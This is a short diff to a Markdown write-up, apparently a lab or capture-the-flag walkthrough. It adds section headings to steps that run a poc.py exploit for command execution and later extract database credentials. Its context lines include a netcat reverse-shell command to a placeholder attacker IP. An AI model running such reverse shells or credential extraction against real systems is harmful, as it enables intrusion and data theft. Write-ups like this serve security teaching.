@@ -929,6 +929,11 @@ else:
 ### 3.2 Executing `poc.py`
 
 With the PoC acquired, execution context was established before attempting anything destructive.
+<div align="center">
+<br>
+</div>
+
+##### 3.2.1 System Enumeration
 
 **Command:** `python3 poc.py "id"`
 
@@ -1055,7 +1060,7 @@ busybox nc <YOUR_IP> 4444 -e /bin/sh
 <br>
 </div>
 
-##### Database Credential Extraction
+##### 3.2.2 Database Credential Extraction
 
 Once the shell connects, query the DB(`reactor.db`) we found:
 
